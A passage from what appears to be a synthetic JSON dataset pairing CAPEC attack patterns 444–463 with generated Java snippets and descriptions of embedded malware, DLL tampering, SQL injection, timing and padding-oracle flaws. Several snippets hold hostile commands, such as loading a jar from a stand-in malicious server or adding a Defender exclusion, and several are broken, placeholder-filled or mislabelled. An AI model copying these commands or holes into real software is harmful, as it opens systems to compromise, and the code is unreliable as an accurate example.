        "description": "This Java code snippet demonstrates a malicious code injector that downloads and executes malicious code from a remote location without verifying its integrity, sets insecure permissions on a file, creates an emergent resource, and overrides the security policy, all of which are violations of the related CWEs."
    },
    {
        "capec_id": "444",
        "code_snippet": "public class MaliciousCode {\n    private static final String SENSITIVE_INFO = \"password=123456\";\n    \n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        if (System.getProperty(\"os.name\").equals(\"Windows\")) {\n            try {\n                Runtime.getRuntime().exec(\"powershell -Command Add-MpPreference -ExclusionPath C:\\\\malware.exe\");\n            } catch (IOException e) {}\n        }\n        \n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(SENSITIVE_INFO);\n        \n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String userInput = \"userInput\";\n        String dynamicCode = \"public class DynamicCode { public static void main(String[] args) { System.out.println(\\\"\" + userInput + \"\\\" ); } }\";\n        Compiler compiler = CompilerFactory.getCompiler(CompilerFactory.JDK_COMPILER);\n        compiler.compile(dynamicCode);\n        \n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        int secureVariable = 0;\n        if (secureVariable == 0) {\n            // Compiler or processor optimization might remove this security check\n            System.out.println(\"Security check passed\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a development alteration attack as described in the CAPEC. It includes multiple CWEs: CWE-506 (Embedded Malicious Code) to execute malicious commands, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) to expose sensitive information, CWE-913 (Improper Control of Dynamically-Managed Code Resources) to execute dynamic code, and CWE-733 and CWE-1037 (Compiler and Processor Optimization Removal or Modification of Security-critical Code) to bypass security checks through compiler or processor optimization."
    },
    {
        "capec_id": "445",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousCodeInjector {\n    public static void main(String[] args) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCodeUrl = \"http://malicious-server.com/malicious.jar\";\n        URL maliciousCodeUrlObject = new URL(maliciousCodeUrl);\n        URLClassLoader classLoader = new URLClassLoader(new URL[] { maliciousCodeUrlObject });\n        Class<?> maliciousClass = classLoader.loadClass(\"MaliciousClass\");\n        Object maliciousObject = maliciousClass.newInstance();\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        String dynamicCode = \"public class DynamicCode { public void execute() { System.out.println(\\\"Malicious code executed\\\"); } }\";\n        Compiler compiler = new Compiler();\n        Class<?> dynamicClass = compiler.compile(dynamicCode);\n        Object dynamicObject = dynamicClass.newInstance();\n        dynamicClass.getMethod(\"execute\").invoke(dynamicObject);\n\n        // CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n        nonReentrantMethod();\n    }\n\n    public static void nonReentrantMethod() {\n        nonReentrantMethod();\n    }\n\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    public static void includeUntrustedFunctionality() {\n        try {\n            Runtime.getRuntime().exec(\"java -jar untrusted-library.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-494: Download of Code Without Integrity Check\n    public static void downloadAndExecuteCode() throws IOException {\n        URL codeUrl = new URL(\"http://untrusted-server.com/code.txt\");\n        File codeFile = new File(\"code.txt\");\n        FileUtils.copyURLToFile(codeUrl, codeFile);\n        Runtime.getRuntime().exec(\"java code.txt\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a configuration management system to inject malicious code into a software product's build, update, or deployment environment. It includes various CWEs such as embedded malicious code, improper control of dynamically-managed code resources, unintended reentrant invocation of non-reentrant code, inclusion of functionality from an untrusted control sphere, and download of code without integrity check."
    },
    {
        "capec_id": "446",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableProduct {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URL url = new URL(\"http://untrusted-source.com/malicious-library.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousDriver\");\n        Object maliciousInstance = maliciousClass.newInstance();\n\n        // CWE-506: Embedded Malicious Code\n        ((MaliciousDriver) maliciousInstance).executeMaliciousCode();\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        VulnerableLibrary vulnerableLibrary = new VulnerableLibrary();\n        vulnerableLibrary.useVulnerableFunction();\n\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        UntrustedComponent untrustedComponent = new UntrustedComponent();\n        untrustedComponent.performUntrustedOperation();\n\n        // CWE-1103: Use of Platform-Dependent Third Party Components\n        PlatformDependentComponent platformDependentComponent = new PlatformDependentComponent();\n        platformDependentComponent.usePlatformDependentFunction();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable product that includes insecure third-party components, making it susceptible to supply chain attacks. It imports a malicious library from an untrusted source, uses a vulnerable third-party component, relies on an insufficiently trusted component, and includes platform-dependent functionality."
    },
    {
        "capec_id": "447",
        "code_snippet": "public class OptimizedVulnerableSystem {\n    private static final String SENSITIVE_INFO = \"secret_key\";\n    \n    public static void main(String[] args) {\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        if (System.getProperty(\"os.name\").equals(\"Windows\")) {\n            // Security-critical code removed or modified by processor optimization\n            System.out.println(\"Windows OS detected\");\n        }\n        \n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(\"Sensitive info: \" + SENSITIVE_INFO);\n        \n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        if (true) {\n            // Security-critical code removed or modified by compiler optimization\n            System.out.println(\"Compiler optimization applied\");\n        }\n        \n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        String userInput = \"user_input\";\n        if (userInput.equals(\"admin\")) {\n            // Client-side enforcement of server-side security\n            System.out.println(\"Admin access granted\");\n        }\n        \n        // CWE-657: Violation of Secure Design Principles\n        String insecureData = \"insecure_data\";\n        System.out.println(\"Insecure data: \" + insecureData);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable system design that embodies the CAPEC of design alteration attacks. It includes multiple CWEs, including processor optimization removal of security-critical code, exposure of sensitive system information, compiler optimization removal of security-critical code, client-side enforcement of server-side security, and violation of secure design principles. These vulnerabilities can be leveraged by an adversary to achieve a negative impact once the system is deployed."
    },
    {
        "capec_id": "448",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.Path;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            String maliciousCode = \"<malicious_code_here>\";\n            byte[] maliciousBytes = maliciousCode.getBytes();\n\n            // CWE-426: Untrusted Search Path\n            String dllPath = System.getProperty(\"user.home\") + \"\\\\malicious_dll.dll\";\n            File dllFile = new File(dllPath);\n            if (!dllFile.exists()) {\n                dllFile.createNewFile();\n            }\n\n            // CWE-1102: Reliance on Machine-Dependent Data Representation\n            byte[] padding = new byte[1024]; // padding for performance gains\n            Files.write(Paths.get(dllPath), padding);\n            Files.write(Paths.get(dllPath), maliciousBytes);\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            Runtime.getRuntime().exec(\"rundll32.exe \" + dllPath);\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(System.getProperty(\"os.name\"));\n            System.out.println(System.getProperty(\"user.name\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of tampering with a DLL and embedding a computer virus into gaps between legitimate machine instructions. It uses CWE-506 to embed malicious code, CWE-426 to use an untrusted search path, CWE-1102 to rely on machine-dependent data representation, CWE-509 to replicate malicious code, and CWE-497 to expose sensitive system information."
    },
    {
        "capec_id": "449",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class MalwareInfection {\n    public static void main(String[] args) {\n        // CWE-507: Trojan Horse\n        String malwarePath = \"C:\\\\malware.exe\";\n        File malwareFile = new File(malwarePath);\n        if (!malwareFile.exists()) {\n            try {\n                // CWE-506: Embedded Malicious Code\n                Runtime.getRuntime().exec(\"cmd /c start \" + malwarePath);\n            } catch (IOException e) {\n                System.out.println(\"Error executing malware\");\n            }\n        }\n\n        // CWE-589: Call to Non-ubiquitous API\n        try {\n            // Using an API function that does not exist on all versions of the target platform\n            System.load(\"C:\\\\nonUbiquitousAPI.dll\");\n        } catch (UnsatisfiedLinkError e) {\n            System.out.println(\"Error loading non-ubiquitous API\");\n        }\n\n        // CWE-67: Improper Handling of Windows Device Names\n        String userInput = \"AUX:\\\\maliciousFile.txt\";\n        File userFile = new File(userInput);\n        if (userFile.exists()) {\n            try {\n                // Attempting to process the pathname as a regular file\n                userFile.delete();\n            } catch (Exception e) {\n                System.out.println(\"Error processing user input\");\n            }\n        }\n\n        // CWE-1277: Firmware Not Updateable\n        // Simulating firmware that cannot be updated\n        System.out.println(\"Firmware is not updateable\");\n    }\n}",
        "description": "This Java code snippet demonstrates a malware infection into product software, which is a deprecated CAPEC pattern. It includes various CWEs such as Trojan Horse, Embedded Malicious Code, Call to Non-ubiquitous API, Improper Handling of Windows Device Names, and Firmware Not Updateable. The code attempts to execute malware, load a non-ubiquitous API, process a Windows device name as a regular file, and simulate firmware that cannot be updated."
    },
    {
        "capec_id": "450",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            String maliciousCode = \"public class Virus { public static void main(String[] args) { while(true) { System.out.println('Virus is running'); } }\";\n            File virusFile = new File(\"Virus.java\");\n            Files.write(virusFile.toPath(), maliciousCode.getBytes());\n            Runtime.getRuntime().exec(\"javac Virus.java\");\n            Runtime.getRuntime().exec(\"java Virus\");\n\n            // CWE-507: Trojan Horse\n            String benignCode = \"public class Benign { public static void main(String[] args) { System.out.println('Benign code is running'); } }\";\n            File benignFile = new File(\"Benign.java\");\n            Files.write(benignFile.toPath(), benignCode.getBytes());\n            Runtime.getRuntime().exec(\"javac Benign.java\");\n            Runtime.getRuntime().exec(\"java Benign\");\n\n            // CWE-426: Untrusted Search Path\n            System.setProperty(\"java.library.path\", \"C:\\\\malicious\\\\dll\");\n            System.loadLibrary(\"malicious\");\n\n            // CWE-67: Improper Handling of Windows Device Names\n            File file = new File(\"AUX\\\\evil.dll\");\n            if(file.exists()) {\n                System.out.println(\"File exists\");\n            }\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            File wormFile = new File(\"Worm.java\");\n            Files.copy(wormFile.toPath(), Paths.get(\"C:\\\\malicious\\\\worm\\\\Worm.java\"), StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern of embedding a virus into a DLL. It includes various CWEs such as embedded malicious code, Trojan Horse, untrusted search path, improper handling of Windows device names, and replicating malicious code. The code creates malicious and benign Java files, compiles and runs them, sets an untrusted search path, and attempts to access a file with a Windows device name. It also replicates malicious code to another location."
    },
    {
        "capec_id": "451",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class MalwareInfection {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"malicious-domain.com\");\n            String firmwareVersion = getFirmwareVersion();\n            if (firmwareVersion == null || !firmwareVersion.startsWith(\"latest\")) {\n                // Update firmware using non-ubiquitous API\n                updateFirmwareUsingNonUbiquitousAPI();\n            }\n            // Authenticate user using deprecated authentication method\n            authenticateUserUsingDeprecatedMethod();\n            // Execute Trojan Horse code\n            executeTrojanHorseCode();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Error: Unable to connect to malicious domain\");\n        }\n    }\n\n    private static String getFirmwareVersion() {\n        // Return null or outdated firmware version\n        return \"outdated\";\n    }\n\n    private static void updateFirmwareUsingNonUbiquitousAPI() {\n        // Use non-ubiquitous API to update firmware\n        System.out.println(\"Firmware updated using non-ubiquitous API\");\n    }\n\n    private static void authenticateUserUsingDeprecatedMethod() {\n        // Authenticate user using deprecated method\n        System.out.println(\"User authenticated using deprecated method\");\n    }\n\n    private static void executeTrojanHorseCode() {\n        // Execute Trojan Horse code\n        System.out.println(\"Trojan Horse code executed\");\n    }\n}",
        "description": "This Java code snippet demonstrates a malware infection into product software, which is a deprecated CAPEC. It uses various CWEs for additional context, including CWE-247 (Reliance on DNS Lookups in a Security Decision), CWE-589 (Call to Non-ubiquitous API), CWE-1277 (Firmware Not Updateable), CWE-592 (Authentication Bypass Issues), and CWE-507 (Trojan Horse). The code attempts to connect to a malicious domain, checks for outdated firmware, updates the firmware using a non-ubiquitous API, authenticates the user using a deprecated method, and executes Trojan Horse code."
    },
    {
        "capec_id": "452",
        "code_snippet": "public class MaliciousHardwareDriver {\n    private static final int DEBUG_REGISTER = 0x12345678;\n    private static final int SENSITIVE_DATA_REGISTER = 0x87654321;\n\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        if (isDebugEnabled()) {\n            // Activate test or debug logic at runtime (CWE-1313)\n            activateDebugMode();\n\n            // Improper access control for register interface (CWE-1262)\n            writeSensitiveDataToRegister(SENSITIVE_DATA_REGISTER, \"malicious_data\");\n        }\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        try {\n            // Simulate voltage glitch\n            simulateVoltageGlitch();\n        } catch (Exception e) {\n            // Ignore exception and continue execution\n        }\n    }\n\n    private static boolean isDebugEnabled() {\n        return true; // Always return true for demonstration purposes\n    }\n\n    private static void activateDebugMode() {\n        // Activate debug mode, allowing for alteration of sensitive data\n        System.out.println(\"Debug mode activated\");\n    }\n\n    private static void writeSensitiveDataToRegister(int register, String data) {\n        // Write sensitive data to register without proper access control\n        System.out.println(\"Writing sensitive data to register: \" + data);\n    }\n\n    private static void simulateVoltageGlitch() throws Exception {\n        // Simulate voltage glitch, potentially allowing for exploitation\n        System.out.println(\"Simulating voltage glitch\");\n        Thread.sleep(1000); // Simulate glitch\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious hardware driver that embodies the CAPEC pattern of inserting malicious logic into hardware. It includes CWE-506: Embedded Malicious Code, CWE-509: Replicating Malicious Code (Virus or Worm), CWE-1247: Improper Protection Against Voltage and Clock Glitches, CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime, and CWE-1262: Improper Access Control for Register Interface."
    },
    {
        "capec_id": "453",
        "code_snippet": "public class MaliciousHardwareController {\n    private boolean isAdmin = false;\n    private String authenticationToken = \"\";\n    \n    public MaliciousHardwareController(String token) {\n        this.authenticationToken = token;\n    }\n    \n    public void injectErrorIntoRedundantBlock() {\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        if (!isAdmin) {\n            // inject error into redundant block\n            System.out.println(\"Error injected into redundant block\");\n        }\n    }\n    \n    public void authenticate() {\n        // CWE-294: Authentication Bypass by Capture-replay\n        if (authenticationToken.equals(\"captured_token\")) {\n            isAdmin = true;\n        }\n    }\n    \n    public void executeMaliciousCode() {\n        // CWE-506: Embedded Malicious Code\n        if (isAdmin) {\n            // execute malicious code\n            System.out.println(\"Malicious code executed\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious hardware controller that injects errors into a redundant block, bypasses authentication using a captured token, and executes malicious code. It embodies the main idea of the deprecated CAPEC pattern, which involves malicious logic insertion into product hardware."
    },
    {
        "capec_id": "454",
        "code_snippet": "public class MaliciousHardware { \n private static String maliciousCode = \"<malicious_code_here>\"; \n private static boolean isUpdateable = false; \n \n public MaliciousHardware() { \n try { \n // undocumented feature \n if (System.getProperty(\"undocumentedFeature\") != null) { \n executeMaliciousCode(); \n } \n } catch (Exception e) { \n // failure to protect stored data from modification \n System.out.println(\"Error: \" + e.getMessage()); \n } \n } \n \n private void executeMaliciousCode() { \n // embedded malicious code \n Runtime.getRuntime().exec(maliciousCode); \n } \n \n public static void main(String[] args) { \n MaliciousHardware maliciousHardware = new MaliciousHardware(); \n } \n }",
        "description": "This Java code snippet demonstrates the CAPEC pattern of malicious logic insertion into product hardware. It includes CWE-506 embedded malicious code, CWE-1329 reliance on a non-updateable component, CWE-1242 inclusion of undocumented features, and CWE-217 failure to protect stored data from modification. The code contains a malicious code string that is executed when an undocumented feature is enabled. The code also demonstrates a failure to protect stored data from modification by catching and printing exceptions instead of properly handling them. Additionally, the code relies on a non-updateable component and includes undocumented features that can create entry points for unauthorized actors."
    },
    {
        "capec_id": "455",
        "code_snippet": "public class MaliciousHardwareController {\n    private boolean isAuthorized = false;\n    private int redundancyLevel = 3;\n\n    public void injectError(int errorType) {\n        if (!isAuthorized) {\n            // CWE-506: Embedded Malicious Code\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            redundancyLevel -= errorType;\n            if (redundancyLevel < 1) {\n                System.out.println(\"Hardware redundancy compromised!\");\n            }\n        }\n    }\n\n    public void storeData(String data) {\n        // CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n        // CWE-766: Critical Data Element\n        // CWE-767: Critical Data Missing\n        String unprotectedData = data;\n        // store unprotectedData in a non-secure location\n    }\n\n    public void authenticate(String credentials) {\n        // CWE-218: DEPRECATED: Failure to provide confidentiality for stored data\n        // CWE-493: Critical Data Exposure\n        if (credentials.equals(\"admin\")) {\n            isAuthorized = true;\n        }\n    }\n\n    public void bypassAuthentication() {\n        // CWE-592: DEPRECATED: Authentication Bypass Issues\n        // CWE-287: Improper Authentication\n        isAuthorized = true;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable hardware controller that allows unauthorized error injection, compromising hardware redundancy. It also includes deprecated CWEs for context, showcasing poor data storage and authentication practices."
    },
    {
        "capec_id": "456",
        "code_snippet": "public class MaliciousMemoryAccess {\n    public static void main(String[] args) {\n        // CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n        int aliasedMemoryRegion = 0x1000;\n        int mirroredMemoryRegion = 0x2000;\n        // Accessing aliased memory region without proper access control\n        System.out.println(\"Accessing aliased memory region: \" + aliasedMemoryRegion);\n\n        // CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n        int protectedMemoryRange = 0x3000;\n        int overlappingMemoryRange = 0x3500;\n        // Overlapping memory ranges without proper access control\n        System.out.println(\"Accessing overlapping memory range: \" + overlappingMemoryRange);\n\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        byte[] volatileMemory = new byte[1024];\n        // Secure-boot process without proper access control for volatile memory\n        System.out.println(\"Accessing volatile memory: \" + volatileMemory);\n\n        // CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n        int mirroredRegionInFabric = 0x4000;\n        // Firewall in on-chip fabric does not protect mirrored memory region\n        System.out.println(\"Accessing mirrored region in fabric: \" + mirroredRegionInFabric);\n\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        int overlappingRegionInFabric = 0x5000;\n        // Address map of on-chip fabric allows overlap of protected and unprotected regions\n        System.out.println(\"Accessing overlapping region in fabric: \" + overlappingRegionInFabric);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of inserting malicious logic into memory to achieve a negative impact. It includes examples of CWE-1257, CWE-1260, CWE-1274, CWE-1312, and CWE-1316, which are related to improper access control and handling of memory regions, allowing an adversary to bypass intended memory protection and access sensitive areas."
    },
    {
        "capec_id": "457",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        String malwareCode = \"<malicious_code_here>\";\n        File maliciousFile = new File(\"malicious_file.exe\");\n        FileOutputStream fos = new FileOutputStream(maliciousFile);\n        fos.write(malwareCode.getBytes());\n        fos.close();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"<sensitive_data_here>\";\n        Scanner scanner = new Scanner(new FileInputStream(\"/dev/ttyUSB0\"));\n        while (scanner.hasNextLine()) {\n            String line = scanner.nextLine();\n            if (line.contains(sensitiveData)) {\n                // Exfiltrate data via wireless connection\n                // CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n                // CWE-1300: Improper Protection of Physical Side Channels\n                // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n                sendWirelessData(line);\n            }\n        }\n    }\n\n    public static void sendWirelessData(String data) {\n        // Implement wireless transmission mechanism here\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious USB device that embeds malicious code, transmits sensitive information in cleartext, and exfiltrates data via a wireless connection, exploiting vulnerabilities in protection mechanisms for alternate hardware interfaces, physical side channels, and electromagnetic fault injection."
    },
    {
        "capec_id": "458",
        "code_snippet": "public class MaliciousFlasher {\n    public static void main(String[] args) {\n        // CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n        byte[] writableMemory = new byte[1024];\n        // Store 'immutable' data in writable memory\n        System.arraycopy(getImmutableData(), 0, writableMemory, 0, getImmutableData().length);\n\n        // CWE-506: Embedded Malicious Code\n        byte[] maliciousCode = getMaliciousCode();\n        System.arraycopy(maliciousCode, 0, writableMemory, getImmutableData().length, maliciousCode.length);\n\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        Bootloader bootloader = new Bootloader(writableMemory);\n        bootloader.boot();\n    }\n\n    // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n    private static byte[] getImmutableData() {\n        return new byte[] { /* sensitive data */ };\n    }\n\n    private static byte[] getMaliciousCode() {\n        return new byte[] { /* malicious code */ };\n    }\n\n    // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n    private static class Bootloader {\n        private byte[] code;\n\n        public Bootloader(byte[] code) {\n            this.code = code;\n        }\n\n        public void boot() {\n            // execute boot code with potential microarchitectural state exposure\n            executeCode(code);\n        }\n    }\n\n    private static void executeCode(byte[] code) {\n        // execute code with potential transient execution\n    }\n}",
        "description": "Java code snippet demonstrating the CAPEC of inserting malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. The code includes CWEs 1282, 506, 1274, 1319, and 1342."
    },
    {
        "capec_id": "459",
        "code_snippet": "import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.PrivateKey; import java.security.cert.Certificate; import java.security.cert.CertificateFactory; import java.security.cert.X509Certificate; import java.util.Base64; import javax.security.auth.x500.X500Principal; import org.bouncycastle.asn1.ASN1ObjectIdentifier; import org.bouncycastle.asn1.x509.X509Name; import org.bouncycastle.jce.X509Principal; import org.bouncycastle.x509.X509V3CertificateGenerator; import org.bouncycastle.x509.extension.X509ExtensionUtil; import org.bouncycastle.x509.extension.X509ExtensionsGenerator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.math.BigInteger; import java.security.KeyFactory; import java.security.spec.PKCS8EncodedKeySpec; import java.security.spec.X509EncodedKeySpec; import java.util.Date; public class CollisionAttack { public static void main(String[] args) throws Exception { // CWE-327: Using a broken or risky cryptographic algorithm (MD5) KeyPairGenerator kpg = KeyPairGenerator.getInstance(\\",
        "description": "This Java code snippet demonstrates a collision attack on a certificate signing request (CSR) using a weak hashing algorithm (MD5). It generates a trusted certificate and a spoofed certificate with a hash collision, allowing the spoofed certificate to be trusted by the certification authority. The code embodies CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-295 (Improper Certificate Validation), CWE-290 (Authentication Bypass by Spoofing), CWE-296 (Improper Following of a Certificate's Chain of Trust), and CWE-297 (Improper Validation of Certificate with Host Mismatch)."
    },
    {
        "capec_id": "460",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String param1 = req.getParameter(\"param1\");\n        String param2 = req.getParameter(\"param2\");\n        String query = \"SELECT * FROM users WHERE param1='\" + param1 + \"' AND param2='\" + param2 + \"'\";\n        Statement stmt = conn.createStatement();\n        ResultSet rs = stmt.executeQuery(query);\n        // Process the result set\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to HTTP Parameter Pollution (HPP) attacks. The servlet constructs a SQL query using user-controlled input from the 'param1' and 'param2' HTTP parameters without proper input validation or neutralization of special characters. An attacker can inject duplicate HTTP parameters to manipulate the SQL query, potentially leading to unauthorized access or data tampering. This code embodies CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-147 (Improper Neutralization of Input Terminators), CWE-235 (Improper Handling of Extra Parameters), CWE-598 (Use of GET Request Method With Sensitive Query Strings), and CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page)."
    },
    {
        "capec_id": "461",
        "code_snippet": "public class AuthenticationService {\n    private static final String SECRET_TOKEN = \"my_secret_token\";\n    private static final String HASH_ALGORITHM = \"MD5\";\n\n    public boolean authenticate(String username, String password, String signature) {\n        String expectedSignature = generateSignature(username, password);\n        if (signature.equals(expectedSignature)) {\n            return true;\n        }\n        return false;\n    }\n\n    private String generateSignature(String username, String password) {\n        String input = username + \":\" + password + \":\" + SECRET_TOKEN;\n        MessageDigest md = MessageDigest.getInstance(HASH_ALGORITHM);\n        byte[] bytes = md.digest(input.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n\n    public static void main(String[] args) {\n        AuthenticationService service = new AuthenticationService();\n        String username = \"john\";\n        String password = \"password\";\n        String signature = service.generateSignature(username, password);\n        System.out.println(\"Generated signature: \" + signature);\n        boolean authenticated = service.authenticate(username, password, signature);\n        System.out.println(\"Authenticated: \" + authenticated);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication service that uses a weak hash algorithm (MD5) to generate a signature for authentication. The service uses a secret token to generate the signature, but an adversary can exploit the weakness in the hash algorithm to generate a legitimate signature without knowledge of the secret token, allowing them to bypass authentication. The code also lacks proper verification of the request, making it vulnerable to CSRF attacks."
    },
    {
        "capec_id": "462",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TimingAttackServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userId = req.getParameter(\"userId\");\n        String password = req.getParameter(\"password\");\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n        String htmlResponse = \"<html><body><h1>Welcome, \" + userId + \"!</h1></body></html>\";\n\n        // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        resp.addHeader(\"Access-Control-Allow-Origin\", \"*\");\n\n        // CWE-352: Cross-Site Request Forgery (CSRF)\n        // No CSRF token verification\n\n        // CWE-208: Observable Timing Discrepancy\n        // Timing attack vulnerability: different response times for valid and invalid users\n        if (isValidUser(userId, password)) {\n            try {\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                // Handle exception\n            }\n        }\n\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(htmlResponse);\n    }\n\n    private boolean isValidUser(String userId, String password) {\n        // Simulate user validation logic\n        return userId.equals(\"admin\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet demonstrates a timing attack vulnerability (CAPEC-208) in a web application. The servlet responds to GET requests with a delay of 2 seconds for valid users, allowing an attacker to infer whether a user exists or not by measuring the response time. The code also includes vulnerabilities related to CWE-79 (cross-site scripting), CWE-352 (cross-site request forgery), and CWE-942 (permissive cross-domain policy with untrusted domains)."
    },
    {
        "capec_id": "463",
        "code_snippet": "public class PaddingOracle {\n    private static final int BLOCK_SIZE = 16;\n    private Cipher cipher;\n    private byte[] key;\n\n    public PaddingOracle(byte[] key) throws Exception {\n        this.key = key;\n        this.cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n    }\n\n    public boolean decrypt(byte[] ciphertext) throws Exception {\n        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, \"AES\"));\n        try {\n            cipher.doFinal(ciphertext);\n            return true;\n        } catch (BadPaddingException e) {\n            return false;\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        byte[] key = new byte[16]; // assume key is generated\n        PaddingOracle po = new PaddingOracle(key);\n        byte[] ciphertext = new byte[BLOCK_SIZE]; // assume ciphertext is generated\n        for (int i = 0; i < BLOCK_SIZE; i++) {\n            for (int j = 0; j < 256; j++) {\n                ciphertext[BLOCK_SIZE - 1 - i] = (byte) j;\n                if (po.decrypt(ciphertext)) {\n                    System.out.println(\"Padding is correct!\");\n                    break;\n                }\n            }\n        }\n    }\n}",
